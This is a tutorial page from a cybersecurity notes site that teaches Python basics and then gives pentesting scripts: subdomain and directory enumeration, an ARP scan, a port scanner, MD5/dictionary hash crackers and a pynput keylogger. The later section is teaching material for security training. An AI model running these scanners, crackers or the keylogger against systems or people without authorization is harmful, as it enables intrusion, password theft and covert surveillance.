

[🏠 Main Site](https://motasem-notes.net/) · [🛒 Store](https://shop.motasem-notes.net/) · [▶ YouTube](https://www.youtube.com/@MotasemHamdan) · [☕ Membership](https://buymeacoffee.com/notescatalog/membership)

> Practitioner-grade cybersecurity notes, cert prep guides, and courses. All premium notes available at **[buymeacoffee.com/notescatalog/extras](https://buymeacoffee.com/notescatalog/extras)** or [shop.motasem-notes.net](https://shop.motasem-notes.net)
## Basics
The example code block below demonstrates a single line of code (on line 2) that, when executed, outputs the text _Hello World_. 
```python
print("Hello World")
```
Let’s break this down:

- **Line 1** is a **comment**, indicated by the hashtag (`#`). Comments are not executed by the computer and are written by the programmer to provide explanations or context for the code, making it easier for others (and yourself) to understand.
    
- The **`print()` statement** controls what is displayed on the screen. Whatever is placed inside the parentheses (`()`) will be output.
    
- Since we are printing a **string** (a sequence of characters), it must be enclosed in quotation marks (`""` or `''`). 

## Math Operators
In Python, mathematical operators allow you to perform basic arithmetic operations, similar to a calculator. By coding these operations, you can create your own calculator, as programming essentially involves defining rules for the computer to follow based on specific inputs and conditions. 
Below is a table of common mathematical operators and their functions:

|**Operator**|**Symbol**|**Description**|**Example**|
|---|---|---|---|
|Addition|`+`|Adds two numbers|`5 + 3` → `8`|
|Subtraction|`-`|Subtracts one number from another|`5 - 3` → `2`|
|Multiplication|`*`|Multiplies two numbers|`5 * 3` → `15`|
|Division|`/`|Divides one number by another (floating-point result)|`5 / 2` → `2.5`|
|Floor Division|`//`|Divides and returns the integer result|`5 // 2` → `2`|
|Modulus|`%`|Returns the remainder of division|`5 % 2` → `1`|
|Exponentiation|`**`|Raises one number to the power of another|`5 ** 2` → `25`|

### Example:
```python
# Addition
print(5 + 3)  # Output: 8
# Subtraction
print(10 - 7)  # Output: 3
# Multiplication
print(4 * 2)  # Output: 8
# Division
print(9 / 2)  # Output: 4.5
# Floor Division
print(9 // 2)  # Output: 4
# Modulus
print(9 % 2)  # Output: 1
# Exponentiation
print(2 ** 3)  # Output: 8
```
## Comparison Operators
In Python, **comparison operators** are used to evaluate conditions and compare values. These operators return a Boolean result—either `True` or `False`—based on whether the specified condition is met. They are essential for controlling the flow of a program, such as in conditional statements and loops.
### Common Comparison Operators in Python

|**Operator**|**Symbol**|**Description**|**Example**|**Result**|
|---|---|---|---|---|
|Equal to|`==`|Checks if two values are equal|`5 == 5`|`True`|
|Not equal to|`!=`|Checks if two values are not equal|`5 != 3`|`True`|
|Greater than|`>`|Checks if the left value is greater than the right|`5 > 3`|`True`|
|Less than|`<`|Checks if the left value is less than the right|`3 < 5`|`True`|
|Greater than or equal to|`>=`|Checks if the left value is greater than or equal to the right|`5 >= 5`|`True`|
|Less than or equal to|`<=`|Checks if the left value is less than or equal to the right|`3 <= 5`|`True`|

**Example Usage**
```python
# Equal to
print(10 == 10)  # Output: True
# Not equal to
print(10 != 5)  # Output: True
# Greater than
print(15 > 10)  # Output: True
# Less than
print(10 < 15)  # Output: True
# Greater than or equal to
print(10 >= 10)  # Output: True
# Less than or equal to
print(5 <= 10)  # Output: True
```
These operators are often used in combination with control flow statements like `if`, `elif`, and `else` to make decisions in the program. For example:
```python
age = 18
if age >= 18:
    print("You are eligible to vote.")
else:
    print("You are not eligible to vote.")
```
## Variables and Data Types
In Python, variables let you store and manage data within a program. Each variable is assigned a name, and data can be stored and updated using that name.
Python variables are versatile because their values can be changed throughout a program. For example, you can assign the variable `age` the value of 30, then increase it by 1 to update its value to 31. Here's an example you can copy, paste, and run to see how it works:
```python
age = 30  # Set the variable 'age' to 30
age += 1  # Increase the value of 'age' by 1
print(age)  # Output: 31
```
Let's discuss Python's data types, which refer to the kind of data a variable can hold. Variables can store text, numbers, or various other data types. Here are the key data types to be familiar with:
- **String**: Represents sequences of characters, such as letters or symbols.
- **Integer**: Holds whole numbers.
- **Float**: Handles numbers with decimal points, often used for fractions.
- **Boolean**: Represents data that can only be either `True` or `False`.
- **List**: A collection used to store a series of items, which can include different data types.
## Boolean Operators
**Python Boolean Operators** are used to compare values and return a Boolean result (`True` or `False`). These operators are essential for decision-making in programs. Here are the main Boolean operators:
### 1. Comparison Operators
- `==` : Checks if two values are equal.  
    Example: `5 == 5` → `True`
- `!=` : Checks if two values are not equal.  
    Example: `5 != 3` → `True`
- `>` : Checks if the left value is greater than the right.  
    Example: `5 > 3` → `True`
- `<` : Checks if the left value is less than the right.  
    Example: `5 < 3` → `False`
- `>=` : Checks if the left value is greater than or equal to the right.  
    Example: `5 >= 5` → `True`
- `<=` : Checks if the left value is less than or equal to the right.  
    Example: `5 <= 6` → `True`
### 2. Logical Operators
- `and` : Returns `True` if both conditions are true.  
    Example: `(5 > 3) and (4 < 6)` → `True`
- `or` : Returns `True` if at least one condition is true.  
    Example: `(5 > 3) or (4 > 6)` → `True`
- `not` : Reverses the Boolean value of a condition.  
    Example: `not (5 > 3)` → `False`
### 3. Membership Operators
- `in` : Checks if a value exists in a sequence (like a list or string).  
    Example: `'a' in 'apple'` → `True`
- `not in` : Checks if a value does not exist in a sequence.  
    Example: `'z' not in 'apple'` → `True`

These operators help in building expressions for conditional statements, loops, and more.
## If Statements
Using **`if` statements** in Python enables a program to make decisions by evaluating a condition and executing specific code based on the result. This allows the program to choose a path of execution depending on the scenario. Here's an example demonstrating how an `if` statement works to determine which section of code to execute:
```python
age = 18

if age >= 18:
    print("You are eligible to vote!")  # This will execute if the condition is True
else:
    print("You are not eligible to vote yet.")  # This will execute if the condition is False
```
**How It Works**
1. The `if` statement checks the condition (`age >= 18`).
2. If the condition is `True`, the first block of code (`print("You are eligible to vote!")`) runs.
3. If the condition is `False`, the `else` block executes (`print("You are not eligible to vote yet.")`).
You can test this code in an editor to see how it evaluates and prints the result!
## Loops
In Python programming, **loops** allow the execution of a block of code multiple times, which is useful for repetitive tasks. Python provides two types of loops:
### 1. For Loop
A **for loop** iterates over a sequence (like a list, string, or range) and executes the block of code for each element.
**Example:**
```python
for i in range(5):  # Iterates from 0 to 4
    print("Iteration:", i)
```
Output:
```
Iteration: 0
Iteration: 1
Iteration: 2
Iteration: 3
Iteration: 4
```
### 2. While Loop
A **while loop** continues to execute the block of code as long as the given condition is `True`.
**Example:**
```python
count = 0
while count < 5:  # Loop continues while 'count' is less than 5
    print("Count is:", count)
    count += 1  # Increment count to avoid an infinite loop
```
Output
```
Count is: 0
Count is: 1
Count is: 2
Count is: 3
Count is: 4
```
### Key Differences:
- **For loop** is used when the number of iterations is known (e.g., iterating through a list or a specific range).
- **While loop** is used when the number of iterations depends on a condition that may change dynamically.

Both loops are powerful tools for automating repetitive tasks in Python.
## Functions
A **function** in Python is a reusable block of code that can be executed whenever it is called within a program. Functions are essential for structuring code effectively and avoiding repetition.
### Example Use Cases:
1. **Performing a Calculation**: A function to calculate the distance between two points:
```python
def calculate_distance(x1, y1, x2, y2):
    distance = ((x2 - x1)**2 + (y2 - y1)**2)**0.5
    return distance
# Call the function
print(calculate_distance(1, 2, 4, 6))  # Outputs: 5.0
```
**Formatting Output**: A function to output text based on conditions:
```python
def greet_user(name, is_admin):
    if is_admin:
        print(f"Welcome, Admin {name}!")
    else:
        print(f"Hello, {name}!")
# Call the function
greet_user("Alice", True)  # Outputs: Welcome, Admin Alice!
greet_user("Bob", False)  # Outputs: Hello, Bob!
```
Structure of a Function:
```python
def function_name(parameters):
    # Code block (instructions)
    return result  # Optional: Return a value
```
Example
```python
def sayHello(name):
     print("Hello " + name + "! Nice to meet you.")

sayHello("ben") # Output is: Hello Ben! Nice to meet you
```
- The `def` keyword indicates the beginning of a function. The function is followed by a `name` that the programmer defines (and is a function parameter). In our example, it's sayHello.
- Following the function name is a pair of parenthesis `()` that holds input values, data that we can pass into the function. In our example, it's a name.
- A colon `:` marks the end of the function header.
In the function, notice the indentation. Similar to if statements, anything after the colons that is indented is considered part of the function.
### Calling the Function:
To execute the function, simply use its name followed by parentheses, including any required arguments inside the parentheses.
Functions are a fundamental part of Python programming, helping you write efficient, clean, and modular code.
## File Operations in Python
Python provides built-in functions for handling files. The most common operations are **reading**, **writing**, and **appending**.
### Reading from a File
You can read the contents of a file into your script.
**Example:**
```python
# Open the file in read mode
with open('websites.txt', 'r') as file:
    for line in file:
        print(line.strip())  # Strip removes extra whitespace or newlines
```
- **Use Case**: Import a list of websites for enumeration or analysis.
- **Output**: Displays each line (e.g., URLs) from the file.
To open the file, we use the built-in open() function, and the "r" parameter stands for "read" and is used as we're reading the contents of the file. The variable has a read() method for reading the contents of the file. You can also use the readlines() method and loop over each line in the file; useful if you have a list where each item is on a new line.
### Writing to a File
You can write data to a file. If the file doesn't exist, it will be created.
**Example:**
```python
# Open the file in write mode
with open('output.txt', 'w') as file:
    file.write('Scan completed successfully!\n')
    file.write('Vulnerabilities found: 3\n')
```
- **Use Case**: Store the results of a vulnerability scan or any processed data.
- **Warning**: Writing mode (`'w'`) overwrites the file content.
### Appending to a File
You can add new content to an existing file without overwriting it.
**Example:**
```python
# Open the file in append mode
with open('output.txt', 'a') as file:
    file.write('Website: example.com - Status: Secure\n')
```
**Use Case**: Continuously log scan results without erasing previous data.
### Reading and Writing Binary Files
For files like images or compiled scripts, you can handle them in binary mode by using `'rb'` or `'wb'`.
**Example:**
```python
# Reading a binary file (e.g., an image)
with open('image.jpg', 'rb') as file:
    data = file.read()

# Writing binary data
with open('copy.jpg', 'wb') as file:
    file.write(data)
```
## Imports
Think of importing a library as gaining access to a set of ready-made functions, classes, or variables designed to perform specific tasks, so you don’t have to write them from scratch. For example, the `datetime` library provides powerful tools for handling dates and times.
### How to Import a Library
Use the `import` statement to include a library in your code.
**Example:**
```python
import datetime

# Using a function from the datetime library
current_date = datetime.datetime.now()
print("Current date and time:", current_date)
```
We import other libraries using the `import` keyword. Then in Python, we use that import's library name to reference its functions. In the example above, we import datetime, then access the .now() method by calling library_name.method_name(). Copy and paste the example above into the code editor.
### Import Specific Functions or Classes
Instead of importing the entire library, you can import just what you need.
**Example:**
```python
from datetime import datetime

# Using the datetime function directly
current_date = datetime.now()
print("Current date and time:", current_date)
```
### Using an Alias for Convenience
You can assign a shorter alias to a library using the `as` keyword.
**Example:**
```python
import datetime as dt

# Accessing the same functionality with an alias
current_date = dt.datetime.now()
print("Current date and time:", current_date)
```
### Example Libraries
1. **Date and Time**: `datetime`, `time`
    - Example: Calculate the difference between two dates.
2. **Mathematical Operations**: `math`
    - Example: `math.sqrt(16)` → Returns 4.0
3. **Web Requests**: `requests`
    - Example: Fetch the content of a webpage.
```python
import requests
response = requests.get('https://example.com')
print(response.text)
```
- **Data Handling**: `pandas`
    - Example: Process and analyze large datasets.
- **Cybersecurity**: `scapy`
    - Example: Perform packet crafting and network scanning.
    - - [Pwntools](https://docs.pwntools.com/en/stable/) - a CTF & exploit development library.

Many of these libraries are already built into the programming language; however, libraries written by other programmers not already installed in your machine can be installed using an application called pip, which is Python's package manager. Let's say you want to install the "scapy" library (which allows you to craft your own packets in code and send them to other machines); you install it first by running the command `pip install scapy`, after which in your program you can now import the scapy library.
## File Downloading
```python
import requests

url = 'https://download.sysinternals.com/files/PSTools.zip'
r = requests.get(url, allow_redirects=True)
open('PSTools.zip', 'wb').write(r.content) 
```

## Security & Pentesting
### Subdomain Enumeration
**Finding subdomains** used by a target organization is an essential step in reconnaissance during cybersecurity assessments. Subdomains can reveal additional infrastructure, services, and potential vulnerabilities that might otherwise go unnoticed. By mapping these subdomains, attackers and penetration testers can significantly broaden the attack surface.

The script will use a list of potential subdomains and prepends them to the domain name provided via a command-line argument.
The script then tries to connect to the subdomains and assumes the ones that accept the connection exist.
```python
import requests 
import sys 

sub_list = open("subdomains.txt").read() 
subdoms = sub_list.splitlines()

for sub in subdoms:
    sub_domains = f"http://{sub}.{sys.argv[1]}" 

    try:
        requests.get(sub_domains)
    
    except requests.ConnectionError: 
        pass
    
    else:
        print("Valid domain: ",sub_domains)   
```
### Directory Enumeration
Once subdomains have been discovered, the next step would be to find directories. The following code will build a simple directory enumeration tool.
```python
import requests 
import sys 

sub_list = open("wordlist.txt").read() 
directories = sub_list.splitlines()

for dir in directories:
    dir_enum = f"http://{sys.argv[1]}/{dir}.html" 
    r = requests.get(dir_enum)
    if r.status_code==404: 
        pass
    else:
        print("Valid directory:" ,dir_enum)
```
### Network Scanning
Python can be utilized to create a basic ICMP (Internet Control Message Protocol) scanner to identify potential targets within a network. However, ICMP packets may be monitored or blocked, as many organizations do not anticipate regular users "pinging" their servers. Additionally, some systems are configured to ignore ICMP requests altogether. These limitations make ARP (Address Resolution Protocol) a more effective method for identifying targets on the local network.
First install `scapy`
```
apt install python3-scapy
```
The scanner code:
```python
from scapy.all import *

interface = "eth0"
ip_range = "10.10.X.X/24"
broadcastMac = "ff:ff:ff:ff:ff:ff"

packet = Ether(dst=broadcastMac)/ARP(pdst = ip_range) 

ans, unans = srp(packet, timeout =2, iface=interface, inter=0.1)

for send,receive in ans:
        print (receive.sprintf(r"%Ether.src% - %ARP.psrc%"))  
```
### Port Scanning
**Importing modules that will help the code run:**
```python
import sys
```

```python
import socket
```

**Modules could also be imported with a single line using**

```python
import socket,sys
```

**Specifying the target:**

```python
ip = '192.168.1.6' 
```

**An empty “open_ports” array that will be populated later with the detected open ports:**  


```python
open_ports =[] 
```


**Ports that will be probed:****

```python

ports = range(1, 65535)
```

For this example, we have chosen to scan all TCP ports using the range() function. However, if you are looking for a specific service or want to save time by scanning a few common ports, the code could be changed as follows;

```python
ports = { 21, 22, 23, 53, 80, 135, 443, 445}
```

The list above is relatively small. As we are trying to keep a rather low profile, we have limited the list to ports that will likely be used by systems connected to a corporate network.Getting the IP address of the domain name given as target. The code also works if the user directly provides the IP address.

Complete Script:
```python
ip = socket.gethostbyname(host)
```
```python
import sys
import socket
import pyfiglet


ascii_banner = pyfiglet.figlet_format("TryHackMe \n Python 4 Pentesters \nPort Scanner")
print(ascii_banner)


ip = '192.168.1.6' 
open_ports =[] 

ports = range(1, 65535)


def probe_port(ip, port, result = 1): 
  try: 
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    sock.settimeout(0.5) 
    r = sock.connect_ex((ip, port))   
    if r == 0: 
      result = r 
    sock.close() 
  except Exception as e: 
    pass 
  return result


for port in ports: 
    sys.stdout.flush() 
    response = probe_port(ip, port) 
    if response == 0: 
        open_ports.append(port) 
    

if open_ports: 
  print ("Open Ports are: ") 
  print (sorted(open_ports)) 
else: 
  print ("Looks like no ports are open :(")
```
### Hash Cracking
A hash is commonly used to protect passwords and other sensitive data. As a penetration tester, you may need to determine the cleartext value of various hashes. Python's `hashlib` library provides the tools to create hash crackers tailored to your specific needs, making it easier to attempt cracking hashes efficiently.
#### Variation 1 
This script will require two inputs: the location of the wordlist and the hash value.

As you probably know, hash values can not be cracked as they do not contain the cleartext value. Unlike encrypted values that can be "reversed" (e.g. decrypted), cleartext values for hashes can only be found starting with a list of potential cleartext values. A simplified process can be seen below;

1. You retrieve the hash value "eccbc87e4b5ce2fe28308fd9f2a7baf3" from a database, which you suspect is the hash for a number between 1 and 5.  
2. You create a file with possible cleartext values (numbers from 1 to 5)  
3. You generate a list of hashes for values in the cleartext list (Hash values for numbers between 1 and 5)  
4. You compare the generated hash with the hash value at hand (Matches hash value of the number 3)

Obviously, a more effective process can be designed, but the main principle will remain identical.

The script below follows an approach close to the one described above;

1. Asks for the location of a wordlist
2. Asks for the hash to be cracked
3. Reads values from the wordlist (one per line)
4. Converts cleartext values to MD5 hash values
5. Compares the generated MD5 hash value with the value entered by the user
```python
import hashlib
import pyfiglet

ascii_banner = pyfiglet.figlet_format("TryHackMe \n Python 4 Pentesters \n HASH CRACKER for MD 5")
print(ascii_banner)

wordlist_location = str(input('Enter wordlist file location: '))
hash_input = str(input('Enter hash to be cracked: '))

with open(wordlist_location, 'r') as file:
    for line in file.readlines():
        hash_ob = hashlib.md5(line.strip().encode())
        hashed_pass = hash_ob.hexdigest()
        if hashed_pass == hash_input:
            print('Found cleartext password! ' + line.strip())
            exit(0)
```
#### Variation 2
```python
import hashlib

def crack_hash(hash_to_crack: str, hash_type: str, wordlist_path: str):
    """
    Tries to crack a hash using a dictionary attack.
    
    Parameters:
    - hash_to_crack: The hash to be cracked (string)
    - hash_type: Hash type (e.g., 'md5', 'sha256')
    - wordlist_path: Path to the wordlist file
    
    Returns:
    - The plain text password if found, else None.
    """
    try:
        with open(wordlist_path, 'r') as wordlist:
            for word in wordlist:
                word = word.strip()  # Remove newline characters
                # Hash the word
                hashed_word = hashlib.new(hash_type, word.encode()).hexdigest()
                # Compare with the hash to crack
                if hashed_word == hash_to_crack:
                    print(f"[+] Password found: {word}")
                    return word
        print("[-] Password not found in the wordlist.")
        return None
    except FileNotFoundError:
        print(f"[-] Wordlist file '{wordlist_path}' not found.")
    except ValueError:
        print(f"[-] Unsupported hash type '{hash_type}'.")
    except Exception as e:
        print(f"[-] An error occurred: {e}")
    return None


if __name__ == "__main__":
    print("### Hash Cracking Script ###")
    hash_to_crack = input("Enter the hash to crack: ").strip()
    hash_type = input("Enter the hash type (e.g., md5, sha256): ").strip().lower()
    wordlist_path = input("Enter the path to the wordlist: ").strip()

    cracked_password = crack_hash(hash_to_crack, hash_type, wordlist_path)
    if cracked_password:
        print(f"Success! The cracked password is: {cracked_password}")
    else:
        print("Failed to crack the hash.")

```
1. Save the script as `hash_cracker.py`.
2. Prepare a **wordlist file** (e.g., `wordlist.txt`) containing potential passwords, one per line.
3. Run the script: `python hash_cracker.py`.
4. Enter:
    - The hash you want to crack.
    - The hash type (e.g., `md5`, `sha256`).
    - The path to your wordlist file.

- Replace `wordlist.txt` with a real dictionary file, such as those from [SecLists](https://github.com/danielmiessler/SecLists).
- Always ensure you have authorization to crack the hash.

### Keylogging
We can use `keyboard` or `pynput` to record keystrokes in python.
```
pip3 install keyboard
pip3 install pynput
```
A sample script using `pynput`
```python
from pynput import keyboard

def on_press(key):
    """
    Function triggered on key press.
    Logs the pressed key to a file.
    """
    try:
        # Record alphanumeric keys
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys
        with open("keylog.txt", "a") as log_file:
            log_file.write(f" {str(key)} ")

def on_release(key):
    """
    Function triggered on key release.
    Stops the keylogger when ESC is pressed.
    """
    if key == keyboard.Key.esc:
        print("Exiting keylogger...")
        return False

if __name__ == "__main__":
    print("Starting keylogger. Press ESC to stop.")
    # Create a listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

```
Using `keyboard` library
```python
import keyboard
keys = keyboard.record(until ='ENTER')
keyboard.play(keys)
```
“keyboard.record” will record the keys until ENTER is pressed, and “keyboard.play” will replay them. As this script is logging keystrokes, any edit using backspace will also be seen.